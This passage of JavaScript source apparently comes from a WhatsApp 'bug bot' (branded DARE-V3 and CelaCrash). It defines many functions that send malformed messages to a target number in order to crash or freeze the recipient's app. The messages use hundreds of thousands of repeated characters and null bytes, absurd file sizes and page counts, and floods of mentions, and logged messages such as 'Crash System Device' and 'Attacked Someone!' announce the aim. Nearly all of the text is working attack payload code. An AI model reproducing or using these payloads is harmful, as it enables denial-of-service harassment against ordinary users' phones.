̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6282332790754".repeat(27000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6282332790754@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, zLoc ? {
      participant: {
        jid: zLoc
      }
    } : {});
    console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
  }
async function freezefile(zLoc, ptcp = false) {
    let virtex = "🌸͜͞.⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤🌿" + "@1".repeat(250000);
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🌿͜͞.⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤🌸",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
} 
    
async function xPokers(zLoc, ptcp = false) {
    let virtex = ".⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤☠️" + "@6282291664759".repeat(25000);
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🦠.⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤☠️",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "6282291664759@s.whatsapp.ney"),
                        groupMentions: [{ groupJid: "6282291664759@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
		
async function xTravas(zLoc, ptcp = false) {
    let virtex = "viralix";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => zLoc);
    
    await Dare.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xinn " }]
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `-> .⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤ `,
                body: `—??`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://byxzmods.com",
                mediaUrl: "https://byxzmods.com"
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


async function Vulcanicx(zLoc, ptcp = false) {
    let virtex = "Cela " + "ꦾ".repeat(40000);
    await Dare.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
        
        
async function NullX(zLoc, ptcp = false) {
    await Dare.relayMessage(zLoc, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " Halo Bro ",
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: zLoc } } : {}
    );
};
async function bakdok(zLoc, ptcp = false) {
 var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `Scarlet DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: zLoc, quoted: ptcp });
await Dare.relayMessage(target, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id });
}
async function CallMsg(zLoc, ptcp = false) {
    await Dare.relayMessage(zLoc, {
                        "messageContextInfo": {
                            "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                            "deviceListMetaData": {},
                            "deviceListMetadataVersion": 2
                        },
                        "scheduledCallCreationMessage": {
                            "scheduledTimestampMs": '1200',
                            callType: "AUDIO",
                            "title": ' # TrashDex - Explanation ' + '❗'.repeat(20000),
                        }
                    }, {
                        additionalAttributes: {
                            edit: '7'
                        }
                    })
                }


async function CaroUsel(zLoc, ptcp = false) {
      let etc = generateWAMessageFromContent(
        zLoc,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑‌Rated Crash ‌",
                },
                nativeFlowMessage: {
                  name: "call_permission_request",
                  messageParamsJson: " ꦾ ",
                },
                carouselMessage: {},
              },
            },
          },
        }),
        {
          userJid: zLoc,
          quoted: m
        }
      );

      await Dare.relayMessage(
        zLoc,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
		async function TanggapanDiterima(zLoc, ptcp = false) {
			await Dare.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "ScarletNuLL",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
			console.log(chalk.green("virailix Attacked Someone! 😴"));
		};
		
  async function uidoc(zLoc, ptcp = false) {
    let uitext = "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
    
    // Freeze Speciality //
     async function locasiV2(zLoc, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈" + "ꦾ".repeat(1099)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function locasifreeze(zLoc, ptcp = false) {
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Cela" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze(zLoc, ptcp = false) {
    let uitext = ".⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤ " + "*~@1~*".repeat(50000);
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                            fileSha256: "dnFCD9DtW/8seNK1KK9RFO/qR7ODsmBI/fkfkybi55s=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: ".⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤",
                            fileEncSha256: "0IrI30eGq8SQ0KSAmUWpPFCr9CIvoZRC/0PFbulTsFU=",
                            directPath: "/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732511963",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "virailix" +  "꧀ *~@1~*".repeat(50000);
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@viralix💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


    async function Gsz(zLoc, ptcp = false) {
      await Dare.relayMessage(
        zLoc,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⚝𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈Foryou⚝" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "",
                },
                carouselMessage: {},
              },
            },
          },
        },
        {
          participant: {
            jid: zLoc,
          },
        }
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
async function uidoc2(zLoc, ptcp = false) {
    let akumw = "~Crash~" + "ꦿꦾ".repeat(50000);
    await Dare.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " .⃟  𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈⃤ ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function liveLokFreeze(zLoc, ptcp = false) {
        let xcl = "ꪶ𖣂ꫂ x𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 厷"+"𑲭𑲭".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": xcl,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "virtex"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: xcl }]
     }
  }
}
}), { userJid: zLoc, quoted: m })
await Dare.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
console.log(chalk.red.bold('Crash System Device By 𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈'))
}

// Ios Speciality //
	async function IosPayM(zLoc, ptcp = false) {
			Dare.relayMessage(zLoc, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			});
			console.log(chalk.green("𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 Bot | Bug Sent "));
		};
		
				async function IosStanza(zLoc, ptcp = false) {
			Dare.relayMessage(zLoc, {
				'extendedTextMessage': {
					'text': '𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈Bugs' + 'ꦾ'.repeat(35000),
					'contextInfo': {
						'stanzaId': zLoc,
						'participant': zLoc,
						'quotedMessage': {
							'conversation': '🌷 𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 Here' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Attacking | Bug Sent 😈"));
		};
		
				async function IosCL(zLoc, ptcp = false) {
			await Dare.relayMessage(zLoc, {
					"extendedTextMessage": {
						"text": " Hello This Is 𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 ",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": zLoc,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": 